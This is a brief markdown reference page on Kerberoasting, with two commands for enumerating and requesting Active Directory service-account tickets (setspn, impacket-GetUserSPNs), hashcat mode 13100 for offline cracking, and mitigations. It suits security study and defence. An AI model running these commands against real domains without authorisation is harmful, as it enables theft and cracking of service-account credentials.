---
description: Kerberoasting reference
---

# Kerberoasting

Kerberoasting is an attack against service accounts that have a Service
Principal Name (SPN) set. Any authenticated domain user can request a Kerberos
service ticket for these accounts and attempt to crack it offline.

## Enumeration

Enumerate accounts with SPNs:

```powershell
setspn -Q */*
```

```bash
impacket-GetUserSPNs domain.local/user -dc-ip 10.10.10.10 -request
```

## Cracking

Request the RC4-HMAC ticket and crack it with hashcat mode 13100.

## Mitigations

Use strong, randomly-generated service account passwords or group Managed
Service Accounts (gMSA).
